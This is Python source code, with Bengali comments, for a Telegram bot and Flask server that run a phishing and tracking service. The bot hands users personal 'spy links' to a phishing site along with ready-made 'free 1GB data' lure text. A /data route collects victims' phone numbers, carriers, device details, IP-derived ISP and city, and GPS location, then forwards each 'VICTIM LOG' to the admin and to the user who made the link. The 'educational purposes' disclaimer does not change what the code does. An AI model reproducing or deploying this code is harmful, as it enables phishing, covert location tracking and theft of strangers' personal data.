import logging
import asyncio
import os
import re
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
import aiohttp

# --- কনফিগারেশন ---
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
PHISHING_SITE_URL = os.environ.get("PHISHING_SITE_URL")
RENDER_APP_URL = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}"

CHANNEL_LINK = "https://t.me/+rj4147h5OD8yMzQ9"
OWNER_USERNAME = "https://t.me/TheSagorOfficial"

# লগিং সেটআপ
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask অ্যাপ ইনিশিয়ালাইজেশন
app = Flask(__name__)

# --- শিকারের ডেটা গ্রহণ করার জন্য ওয়েব রুট ---
@app.route('/data', methods=['POST'])
async def handle_data():
    try:
        data = await request.get_json()
        logger.info(f"Received data packet: {data}")
        
        # শিকারের আসল আইপি অ্যাড্রেস বের করা
        if request.headers.getlist("X-Forwarded-For"):
            victim_ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            victim_ip = request.remote_addr
        
        logger.info(f"Victim IP identified as: {victim_ip}")

        # ব্যাকগ্রাউন্ডে ডেটা প্রসেসিং শুরু করা
        asyncio.create_task(process_victim_data(data, victim_ip))
        
        return jsonify({"status": "success", "message": "Data received"}), 200
    except Exception as e:
        logger.error(f"Error in handle_data: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

async def get_ip_details(ip):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip}') as response:
                if response.status == 200:
                    return await response.json()
    except Exception as e:
        logger.error(f"Failed to get IP details for {ip}: {e}")
    return {}

async def process_victim_data(data, victim_ip):
    bot = Bot(token=TOKEN)
    student_id = data.get('student_id', 'unknown')
    form_data = data.get('form_data', {})
    device_info = data.get('device_info', {})
    location_info = data.get('location_info', {})

    ip_details = await get_ip_details(victim_ip)

    location_link = "Not Available"
    if 'lat' in location_info and 'lon' in location_info:
        location_link = f"https://www.google.com/maps?q={location_info['lat']},{location_info['lon']}"

    # --- অ্যাডমিনের জন্য মেসেজ তৈরি ---
    admin_message = f"""
[student_id={student_id}]
💀 ***====[ VICTIM LOG | @TheSagorOfficial ]====*** 💀

--- ***FORM DATA*** ---
📞 ***Number:*** `{form_data.get('country')} {form_data.get('mobileNumber')}`
📡 ***Operator:*** `{form_data.get('operator')}`

--- ***IP & LOCATION*** ---
🌐 ***IP Address:*** `{victim_ip}`
🏢 ***ISP:*** `{ip_details.get('isp', 'N/A')}`
🔍 ***ASN:*** `{ip_details.get('as', 'N/A')}`
🌍 ***Country:*** `{ip_details.get('country', 'N/A')}`
🏙️ ***City:*** `{ip_details.get('city', 'N/A')}`
📍 ***Google Maps:*** [View on Map]({location_link})

--- ***DEVICE INFO*** ---
📱 ***Device Type:*** `{device_info.get('deviceType', 'N/A')}`
🔋 ***Battery:*** `{device_info.get('battery', {}).get('level', 'N/A')}`
🔌 ***Charging:*** `{device_info.get('battery', {}).get('charging', 'N/A')}`
📶 ***Network:*** `{device_info.get('network', 'N/A')}`
🖥️ ***Screen:*** `{device_info.get('screen', 'N/A')}`
⏰ ***TimeZone:*** `{device_info.get('timeZone', 'N/A')}`
🆔 ***Platform:*** `{device_info.get('platform', 'N/A')}`
🕵️ ***User Agent:*** `{device_info.get('userAgent', 'N/A')}`

--- ***STATUS*** ---
🎯 ***Location Status:*** `{location_info.get('error') or f"Success ({location_info.get('accuracy', 'N/A')}m accuracy)"}`
"""
    try:
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode='Markdown')
        logger.info(f"Admin log sent for student {student_id}")
    except Exception as e:
        logger.error(f"Failed to send log to admin: {e}")

# --- টেলিগ্রাম বট হ্যান্ডলার ---
async def start_command(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    welcome_message = (
        f"Welcome, {user.first_name}!\n\n"
        "You can use this bot to generate a spy link! 🎉\n\n"
        "𝗬𝗼𝘂 𝗰𝗮𝗻 𝗛𝗮𝗰𝗸 :\n"
        "🔹 Front Camera\n🔹 Back Camera\n🔹 Location with map\n🔹 Phone number\n🔹 Sim Type\n🔹 IP, Battery, and many more\n🔹 Device type\n\n"
        "𝗡𝗼𝘁𝗲: 𝗜𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗳𝘂𝗻 𝗮𝗻𝗱 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀 💡\n\n"
        "Now press create button to generate your link. 😊"
    )
    keyboard = [[InlineKeyboardButton("Create", callback_data='create_link')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

async def create_link_handler(update: Update, context: CallbackContext) -> None:
    user_id = update.effective_user.id
    personal_link = f"{PHISHING_SITE_URL}?id={user_id}"
    message_text = (
        "🎉 𝗬𝗼𝘂𝗿 𝗨𝗻𝗶𝗾𝘂𝗲 𝗧𝗿𝗮𝗰𝗸𝗶𝗻𝗴 𝗟𝗶𝗻𝗸 𝗶𝘀 𝗥𝗲𝗮𝗱𝘆! 🎉\n\n"
        f"🔗 𝗬𝗼𝘂𝗿 𝗟𝗶𝗻𝗸: `{personal_link}`\n\n"
        "📝𝗡𝗼𝘁𝗲⚠\n\n->This bot 𝗨𝗥𝗟 not work complete on telegram web\n\n->So Use this 𝗨𝗥𝗟 on chrome or others browsers.✅\n\n"
        "Feel The power 💪⚡ of sagor Sheikh 😎"
    )
    share_text = (
        "🌟𝗘𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗢𝗳𝗳𝗲𝗿: 𝗖𝗹𝗮𝗶𝗺 𝗬𝗼𝘂𝗿 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕 𝗗𝗮𝘁𝗮!🌟\n\n"
        "Looking for a quick internet boost? 🎁\nEnjoy 1GB of free internet 🌍✨!\n\n"
        "✨ 𝗖𝗹𝗮𝗶𝗺 𝘆𝗼𝘂𝗿 𝗙𝗥𝗘𝗘 𝟭𝗚𝗕 𝗻𝗼𝘄! 🚀\n\n"
        f"👉𝗚𝗲𝘁 Your 𝗙𝗿𝗲𝗲 𝟭𝗚𝗕\n👉{personal_link}\n\n"
        "Don't wait, 𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘁𝗶𝗺𝗲 𝗼𝗳𝗳𝗲𝗿!"
    )
    telegram_share_url = f"https://t.me/share/url?url=&text={share_text.replace(' ', '%20').replace(' ', '%0A')}"
    keyboard = [
        [InlineKeyboardButton("Share this with friends", url=telegram_share_url)],
        [InlineKeyboardButton("My another Channel", url=CHANNEL_LINK)],
        [InlineKeyboardButton("Contact owner if any issue", url=OWNER_USERNAME)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode='Markdown')

async def message_filter(update: Update, context: CallbackContext) -> None:
    if str(update.message.chat_id) != str(ADMIN_CHAT_ID): return
    text = update.message.text or update.message.caption
    if not text: return
    match = re.search(r'\[student_id=(\d+)\]', text)
    if not match: return
    student_id = match.group(1)
    clean_message = re.sub(r'\[student_id=\d+\]\s*', '', text).strip()
    try:
        if update.message.photo:
            await context.bot.send_photo(chat_id=student_id, photo=update.message.photo[-1].file_id, caption=clean_message, parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=student_id, text=clean_message, parse_mode='Markdown')
        logger.info(f"Log successfully forwarded to student {student_id}")
    except Exception as e:
        logger.error(f"Failed to forward log to student {student_id}: {e}")
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"⚠️ **Failed to deliver log to student `{student_id}`.** They might have blocked the bot.", parse_mode='Markdown')

# --- মূল সেটআপ এবং রান ফাংশন ---
async def main():
    bot = Bot(TOKEN)
    application = Application.builder().bot(bot).build()

    # কমান্ড এবং বাটন হ্যান্ডলার
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("create", create_link_handler))
    application.add_handler(CallbackQueryHandler(create_link_handler, pattern='^create_link$'))
    application.add_handler(MessageHandler(filters.TEXT | filters.PHOTO, message_filter))

    # Webhook সেট করা
    await application.bot.set_webhook(url=f"{RENDER_APP_URL}/telegram")
    
    # Flask অ্যাপকে application-এর সাথে সংযুক্ত করা
    async with application:
        await application.start()
        # Flask অ্যাপটি একটি ভিন্ন থ্রেডে বা async-compatible সার্ভারে চালানো উচিত
        # কিন্তু Render-এর জন্য, gunicorn এটি সামলে নেবে।
        # এখানে আমরা শুধু টেলিগ্রাম application চালু রাখছি।
        # gunicorn bot:app কমান্ডটি Flask অ্যাপটি চালাবে।
        logger.info("Telegram bot application started, waiting for gunicorn to serve Flask app.")
        await application.updater.start_polling() # লোকাল টেস্টিং এর জন্য
        # await application.run_until_disconnected() # ডেপ্লয়মেন্টের জন্য

if __name__ == '__main__':
    # এই অংশটি এখন gunicorn দ্বারা চালিত হবে, সরাসরি নয়।
    # তবে লোকাল টেস্টিং এর জন্য এটি রাখা যেতে পারে।
    # asyncio.run(main())
    pass
